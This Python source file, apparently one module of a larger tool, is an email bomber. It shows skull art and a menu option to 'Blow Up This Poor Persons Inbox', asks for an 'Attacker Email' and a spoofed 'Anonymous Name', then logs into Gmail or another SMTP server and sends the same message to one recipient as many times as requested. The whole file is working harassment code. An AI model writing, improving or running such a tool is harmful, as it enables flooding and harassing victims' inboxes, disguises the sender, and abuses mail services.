from getpass import getpass
from time import sleep
import sys
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
from rich.progress import track
from rich import print

art = '[bold red]                           .\n                           .\n                           .       :\n                           :      .\n                  :..   :  : :  .\n                     ..  ; :: .\n                        ... .. :..\n                       ::: :...\n                   ::.:.:...;; .....\n                :..     .;.. :;     ..\n                      . :. .  ;.\n                       .: ;;: ;.\n                      :; .BRRRV;\n                         YB BMMMBR\n                        ;BVIMMMMMt\n                  .=YRBBBMMMMMMMB\n                =RMMMMMMMMMMMMMM;\n              ;BMMR=VMMMMMMMMMMMV.\n             tMMR::VMMMMMMMMMMMMMB:\n            tMMt ;BMMMMMMMMMMMMMMMB.\n           ;MMY ;MMMMMMMMMMMMMMMMMMV\n           XMB .BMMMMMMMMMMMMMMMMMMM:\n           BMI +MMMMMMMMMMMMMMMMMMMMi\n          .MM= XMMMMMMMMMMMMMMMMMMMMY\n           BMt YMMMMMMMMMMMMMMMMMMMMi\n           VMB +MMMMMMMMMMMMMMMMMMMM:\n           ;MM+ BMMMMMMMMMMMMMMMMMMR\n            tMBVBMMMMMMMMMMMMMMMMMB.\n             tMMMMMMMMMMMMMMMMMMMB:\n              ;BMMMMMMMMMMMMMMMMY\n               +BMMMMMMMMMMMBY:\n                  :+YRBBBRVt;'

def single_email():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

    print('\n')
    print(art)
    print('[bold cyan]     ____________________________________________')

    print("\n [1] Send One Email ")
    print('\n [2] Blow Up This Poor Persons Inbox ')
    print('\n [3] Main Menu ')
    answer = input('\n -> ')
    if answer == '1':
        number = 1
    elif answer == '2':
        number = input('\n Number of Emails: ')
    elif answer == '3':
        if platform.system() == 'Windows':
            os.system('py main.py')
        else:
            os.system('Python3 main.py')
    else:
        print('[bold red] [!] Unrecognized Input ')
        sys.exit()

    message = MIMEMultipart()
    username = input('\n Anonymous Name: ')
    sender_email = input('\n Attacker Email: ')
    password = getpass('\n Attacker Password: ')
    receiver_email = input('\n Recipient Email: ')
    subject = input('\n Subject: ')
    message['From'] = username
    message['To'] = receiver_email
    message['Subject'] = subject

    body = input('\n Message: ')
    message.attach(MIMEText(body, 'plain'))

    server = input('\n Are you using gmail [y/n]? ')
    if server == 'y':
        port = 587
        smtp = 'smtp.gmail.com'
    elif server == 'n':
        port = input('\n Port: ')
        smtp = input('\n SMTP Server [smtp.example.com]: ')
    else:
        print('[bold red] [!] Unrecognized Input ')
        sys.exit()

    file = input('\n Do you want to attach a file [y/n]? ')
    if file == 'y':
        filename = input('\n File Path: ')
        attachment = open(filename, 'rb')
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment.read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', f'attachment; filename={filename}')
        message.attach(p)
    elif file not in ['n', 'y']:
        print('[bold red] [!] Unrecognized Input ')
        sys.exit()

    try:
        server = smtplib.SMTP(smtp, port)
        server.ehlo()
        server.starttls()
        server.login(sender_email, password)
        for i in track(range(1, int(number)+1), description="[bold cyan] Bombing..."):
            text = message.as_string()
            server.sendmail(sender_email, receiver_email, text)
            sleep(1)
            sys.stdout.flush()
        server.quit()
        print('[bold cyan]\n Bomb Completed!')
        print('[bold cyan] E-mails sent: %i' % i)
        sys.exit()

    except KeyboardInterrupt:
        print('\n')
        print('\n[bold red] [-] Bombing Interrupted')
        sys.exit()

    except Exception as e:
        print("\n[bold red] [!] Something went wrong.. Printing the error: {0}".format(e))
